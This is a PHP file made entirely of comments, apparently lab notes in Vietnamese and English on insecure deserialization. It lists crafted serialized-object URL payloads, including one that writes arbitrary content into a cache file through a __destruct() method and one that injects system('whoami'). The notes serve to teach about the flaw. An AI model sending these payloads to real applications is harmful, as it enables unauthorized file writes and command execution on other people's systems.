<?php

// require('runt/data.php');
// Observing insecure deserialization
// Hãy tưởng tượng rằng một nhà phát triển đang cố gắng truyền dữ liệu giữa hai hệ thống. Họ quyết định tuần tự hóa đối tượng dữ liệu và sau đó thực hiện một cuộc gọi HTTP đến một điểm cuối API.
// Dự án này là điểm cuối nhận và họ muốn có thể thực hiện các hoạt động trên Pickleđối tượng.
// URL: /?data=O:22:%22UnserializeDemo\Pickle%22:1:{s:4:%22name%22;s:4:%22Rick%22;}
// URL: /?data=O:23:%22UnserializeDemo\Weather%22:2:{s:11:%22weatherData%22;s:27:%22cloudy%20with%20a%20chance%20of%20XSS%22;s:35:%22UnserializeDemo\WeathercachedData%22;s:17:%22absolutely%20lovely%22;}
// Cuộc tấn công có thể xảy ra vì lớp Weather lưu dữ liệu của nó một cách ngây thơ trong __destruct()phương thức.
// Điều này không chỉ khiến bộ nhớ cache của bạn không bao giờ được làm mới đúng cách (và do đó là lỗi), mà còn là một lỗ hổng bảo mật vì nó cho phép kẻ tấn công ghi nội dung tùy ý vào tệp lưu trữ bộ nhớ cache.


// require('runs/gerenal.php');
// URL r= "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
// URL r= "a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}"


